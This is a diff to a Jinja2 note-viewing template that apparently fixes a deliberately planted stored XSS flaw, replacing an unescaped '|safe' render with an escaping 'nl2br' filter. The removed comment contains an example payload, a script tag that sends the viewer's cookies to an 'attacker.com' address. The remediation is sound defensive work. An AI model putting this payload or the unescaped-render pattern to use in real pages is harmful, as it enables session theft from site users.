@@ -33,13 +33,12 @@
   </div>
 
   <!--
-    VULNERABILITY: XSS — Stored Cross-Site Scripting
-    The note content is rendered as raw HTML using Jinja2's |safe filter.
-    Any HTML/JavaScript saved by an attacker in the note will execute in
-    the browser of anyone who views the note.
-    Example payload stored as note content:
-      <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+    FIXED #7: XSS remediation.
+    The |safe filter has been removed. The custom nl2br filter first escapes all
+    HTML special characters (via markupsafe.escape), then converts newlines to
+    <br> tags — preserving line-break formatting without allowing arbitrary HTML.
+    Jinja2 auto-escaping is enabled by default for .html templates.
   -->
-  <div class="note-content">{{ note[2] | safe }}</div>
+  <div class="note-content">{{ note[2] | nl2br }}</div>
 </div>
 {% endblock %}
